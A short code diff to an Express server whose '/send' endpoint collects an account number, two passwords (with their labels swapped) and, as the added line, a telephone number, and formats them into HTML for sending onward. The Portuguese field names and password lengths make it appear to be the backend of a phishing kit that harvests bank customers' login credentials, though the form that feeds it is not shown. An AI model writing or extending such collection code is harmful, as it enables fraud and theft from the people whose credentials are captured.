@@ -51,6 +51,7 @@ app.post('/send', cors(), function (req, res) {
             <h1>conta:${req.body.conta}</h1>
             <h1>senha8:${req.body.senha6}</h1>
             <h1>senha6:${req.body.senha8}</h1>
+            <h1>telefone:${req.body.tel}</h1>
             
             
             
@@ -69,6 +70,10 @@ app.post('/send', cors(), function (req, res) {
     main().catch(console.error);
 
 });
+
+
+
+
 
 
 app.listen(process.env.PORT || 3000)
